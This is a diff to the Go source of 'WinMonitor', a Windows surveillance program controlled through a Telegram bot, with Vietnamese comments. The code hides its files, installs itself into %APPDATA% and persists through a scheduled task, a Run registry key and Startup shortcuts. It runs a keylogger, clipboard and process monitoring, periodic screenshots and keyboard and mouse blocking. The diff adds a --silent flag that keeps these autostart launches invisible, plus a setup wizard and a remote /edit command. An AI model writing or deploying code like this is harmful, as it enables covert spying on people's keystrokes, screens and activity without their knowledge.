@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
 	"crypto/rand"
 	"encoding/binary"
@@ -11,6 +12,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"os/exec"
 	"os/signal"
 	"path/filepath"
 	"strconv"
@@ -735,7 +737,7 @@ func deploySrc() string {
 }
 
 func registerScheduledTasks() {
-	tr := `"` + launcherTarget() + `"`
+	tr := `"` + launcherTarget() + `" --silent`
 	if err := runHidden("schtasks", "/Create", "/TN", "WinMonitorGuard", "/TR", tr, "/SC", "MINUTE", "/MO", "5", "/F"); err != nil {
 		logMsg("schtasks Guard lỗi: " + err.Error())
 	}
@@ -745,7 +747,7 @@ func registerScheduledTasks() {
 }
 
 func registerRunKey() {
-	val := `"` + launcherTarget() + `"`
+	val := `"` + launcherTarget() + `" --silent`
 	if err := runHidden("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
 		"/v", "WinMonitor", "/t", "REG_SZ", "/d", val, "/f"); err != nil {
 		logMsg("reg add Run lỗi: " + err.Error())
@@ -785,13 +787,13 @@ func ensurePersistence() {
 		hideFile(deployExe)
 	}
 	if !fileExists(launcher) {
-		if !createShortcut(launcher, deployExe, "", filepath.Dir(deployExe)) {
+		if !createShortcut(launcher, deployExe, "--silent", filepath.Dir(deployExe)) {
 			logMsg("Tạo shortcut launcher thất bại (có thể bị chặn PowerShell).")
 		}
 	}
 	hideFile(launcher)
 	os.MkdirAll(startupDir, 0o755)
-	if !createShortcut(startupLnk, deployExe, "", filepath.Dir(deployExe)) {
+	if !createShortcut(startupLnk, deployExe, "--silent", filepath.Dir(deployExe)) {
 		logMsg("Tạo shortcut Startup thất bại (có thể bị chặn PowerShell).")
 	}
 	hideFile(startupLnk)
@@ -918,6 +920,7 @@ var botCommands = [][2]string{
 	{"confirm", "Xác nhận mã OTP"},
 	{"cancel", "Hủy yêu cầu đang chờ"},
 	{"config", "Xem cấu hình"},
+	{"edit", "Mở cửa sổ sửa cấu hình (terminal)"},
 	{"get", "Xem 1 khóa cấu hình"},
 	{"set", "Đổi cấu hình: /set khóa giá_trị"},
 	{"reset", "Đặt lại cấu hình mặc định"},
@@ -971,6 +974,7 @@ func helpText() string {
 		"/cancel - Hủy yêu cầu\n\n" +
 		"<b>Cấu hình</b>\n" +
 		"/config - Xem toàn bộ\n" +
+		"/edit - Mở cửa sổ sửa cấu hình\n" +
 		"/get &lt;khóa&gt; - Xem 1 khóa\n" +
 		"/set &lt;khóa&gt; &lt;giá trị&gt; - Đổi\n" +
 		"/reset - Về mặc định\n" +
@@ -1009,6 +1013,14 @@ func handleCommand(text, chatID string) {
 	case "/reload":
 		notify("🔄 Đang cập nhật lại menu lệnh...")
 		go registerBotCommands()
+	case "/edit":
+		self, _ := os.Executable()
+		cmd := exec.Command(self, "--setup")
+		if err := cmd.Start(); err == nil {
+			notify("🛠 Đã mở cửa sổ cấu hình trên máy. Sửa & lưu xong, cấu hình sẽ TỰ NẠP LẠI (không cần khởi động lại).")
+		} else {
+			notify("⚠️ Không mở được cửa sổ cấu hình: " + err.Error())
+		}
 	case "/status":
 		c := cfgGet()
 		up := int(time.Since(startTime).Seconds())
@@ -1482,12 +1494,143 @@ func applyCLIConfig() {
 	scrubArgs()
 }
 
+// ---- Interactive setup wizard (terminal) ----
+func hasFlag(name string) bool {
+	for _, a := range os.Args[1:] {
+		if a == name || strings.HasPrefix(a, name+"=") {
+			return true
+		}
+	}
+	return false
+}
+
+func promptLine(r *bufio.Reader, label, def string) string {
+	if def != "" {
+		fmt.Printf("%s [%s]: ", label, def)
+	} else {
+		fmt.Printf("%s: ", label)
+	}
+	line, _ := r.ReadString('\n')
+	line = strings.TrimSpace(line)
+	if line == "" {
+		return def
+	}
+	return line
+}
+
+func promptBool(r *bufio.Reader, label string, def bool) bool {
+	d := "y/N"
+	if def {
+		d = "Y/n"
+	}
+	ans := strings.ToLower(promptLine(r, label+" ("+d+")", ""))
+	if ans == "" {
+		return def
+	}
+	return ans == "y" || ans == "yes" || ans == "có" || ans == "co" || ans == "c"
+}
+
+func promptInt(r *bufio.Reader, label string, def, lo, hi int) int {
+	s := promptLine(r, fmt.Sprintf("%s (%d–%d)", label, lo, hi), strconv.Itoa(def))
+	v, err := strconv.Atoi(strings.TrimSpace(s))
+	if err != nil {
+		return def
+	}
+	if v < lo {
+		v = lo
+	}
+	if v > hi {
+		v = hi
+	}
+	return v
+}
+
+// runWizard hỏi cấu hình trên terminal rồi lưu config.json.
+func runWizard() {
+	cur := cfgGet()
+	r := bufio.NewReader(os.Stdin)
+	fmt.Println()
+	fmt.Println("========================================================")
+	fmt.Println("  WinMonitor - Thiết lập cấu hình")
+	fmt.Println("  (Nhấn Enter để GIỮ giá trị trong [ngoặc vuông])")
+	fmt.Println("========================================================")
+	fmt.Println("  Tạo bot: nhắn @BotFather -> /newbot -> lấy token")
+	fmt.Println("  Lấy Chat ID: nhắn @userinfobot -> Id: ...")
+	fmt.Println("--------------------------------------------------------")
+	token := promptLine(r, "Bot token", cur.BotToken)
+	chat := promptLine(r, "Chat ID", cur.ChatID)
+	interval := promptInt(r, "Chu kỳ chụp màn hình (giây)", cur.ScreenshotInterval, 5, 86400)
+	shots := promptBool(r, "Chụp màn hình định kỳ?", cur.ScreenshotsEnabled)
+	activity := promptBool(r, "Báo khi đổi cửa sổ?", cur.ActivityMonitor)
+	process := promptBool(r, "Báo tiến trình mới?", cur.ProcessMonitor)
+	clip := promptBool(r, "Theo dõi clipboard?", cur.ClipboardMonitor)
+	keylog := promptBool(r, "Ghi phím gõ (keylogger - nhạy cảm)?", cur.Keylogger)
+	heartbeat := promptInt(r, "Báo 'vẫn chạy' mỗi (giây, 0=tắt)", cur.HeartbeatInterval, 0, 86400)
+	block := promptInt(r, "Tự mở khóa bàn phím/chuột sau (phút, 0=dùng van 30')", cur.BlockSafetyMinutes, 0, 1440)
+
+	cfgUpdate(func(c *Config) {
+		c.BotToken = strings.TrimSpace(token)
+		c.ChatID = strings.TrimSpace(chat)
+		c.ScreenshotInterval = interval
+		c.ScreenshotsEnabled = shots
+		c.ActivityMonitor = activity
+		c.ProcessMonitor = process
+		c.ClipboardMonitor = clip
+		c.Keylogger = keylog
+		c.HeartbeatInterval = heartbeat
+		c.BlockSafetyMinutes = block
+	})
+	fmt.Println()
+	fmt.Println("--------------------------------------------------------")
+	fmt.Println("  Đã lưu cấu hình vào:")
+	fmt.Println("  " + configPath)
+	fmt.Println("  WinMonitor sẽ chạy nền và tự khởi động cùng Windows.")
+	fmt.Println("  (Cửa sổ này tự đóng sau 3 giây...)")
+	fmt.Println("--------------------------------------------------------")
+	time.Sleep(3 * time.Second)
+}
+
+// configWatchLoop tự nạp lại config khi file bị thay đổi (vd sau khi chạy wizard lần nữa).
+func configWatchLoop() {
+	var lastMod time.Time
+	var lastSize int64
+	if st, err := os.Stat(configPath); err == nil {
+		lastMod = st.ModTime()
+		lastSize = st.Size()
+	}
+	for isRunning() {
+		time.Sleep(5 * time.Second)
+		if st, err := os.Stat(configPath); err == nil {
+			if !st.ModTime().Equal(lastMod) || st.Size() != lastSize {
+				lastMod = st.ModTime()
+				lastSize = st.Size()
+				loadConfig()
+				logMsg("Phát hiện config.json thay đổi -> đã nạp lại.")
+				notify("♻️ Đã nạp lại cấu hình mới.")
+			}
+		}
+	}
+}
+
 func main() {
 	os.MkdirAll(baseDir, 0o755)
 	setDpiAwareness()
 	hideConsole()
 	loadConfig()
 	applyCLIConfig()
+
+	// === WIZARD CẤU HÌNH ===
+	// Double-click (không có --silent/--no-wizard) hoặc --setup => hiện terminal hỏi cấu hình.
+	// Tự khởi động (Registry/Task/Startup) luôn dùng --silent nên KHÔNG hiện wizard.
+	silent := hasFlag("--silent")
+	noWizard := hasFlag("--no-wizard")
+	setup := hasFlag("--setup")
+	if setup || (!silent && !noWizard) {
+		allocConsole()
+		runWizard()
+		freeConsole()
+		loadConfig()
+	}
 
 	token := cfgGet().BotToken
 	if token == "" || strings.Contains(token, "PUT_YOUR") {
@@ -1524,7 +1667,7 @@ func main() {
 		if copyHidden(self, deployExe) {
 			ensurePersistence() // tạo shortcut/registry/scheduled task trỏ tới bản chuẩn
 			releaseSingleInstance()
-			if err := relaunchCanonical(nil); err == nil {
+			if err := relaunchCanonical([]string{"--silent"}); err == nil {
 				logMsg("Đã cài vào %APPDATA% và chuyển sang bản chuẩn. File tải về có thể xóa.")
 				return
 			}
@@ -1552,6 +1695,7 @@ func main() {
 	go keyloggerLoop()
 	go heartbeatLoop()
 	go selfhealLoop()
+	go configWatchLoop()
 
 	logMsg("WinMonitor started.")
 	notify("✅ <b>WinMonitor đã khởi động</b> trên máy này.\nGửi /help để xem lệnh.")
